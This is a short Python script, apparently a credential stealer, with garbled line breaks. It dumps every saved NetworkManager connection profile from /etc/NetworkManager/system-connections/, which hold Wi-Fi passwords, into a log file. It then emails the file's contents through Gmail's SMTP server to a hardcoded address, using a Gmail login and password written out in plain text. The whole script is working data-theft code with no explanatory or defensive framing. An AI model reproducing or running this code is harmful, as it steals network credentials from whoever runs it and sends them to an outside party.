import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
###############
MAIN
PROGRAMM
########################
subprocess.call('cd /etc/NetworkManager/system-connections/ &&
cat
/etc/NetworkManager/system-connections/*
>
log.txt',shell=True)data
=
subprocess.check_output(['cat','/etc/NetworkManager/system-
connections/log.txt']).decode('utf-8').strip('\n')
### informations du compte Gmail ###
email = 'anesbouach@gmail.com'
password = 'therecoveryhacker!'
send_to_email = 'anesbouach@gmail.com'
subject = 'wifi password'
message = data
### CONNEXION ET ENVOI DE DONNÉES ###
msg = MIMEMultipart()
msg['From'] = email
msg['To'] = send_to_email
msg['Subject'] = subject
msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email, password)text = msg.as_string()
server.sendmail(email, send_to_email, text)
server.quit()
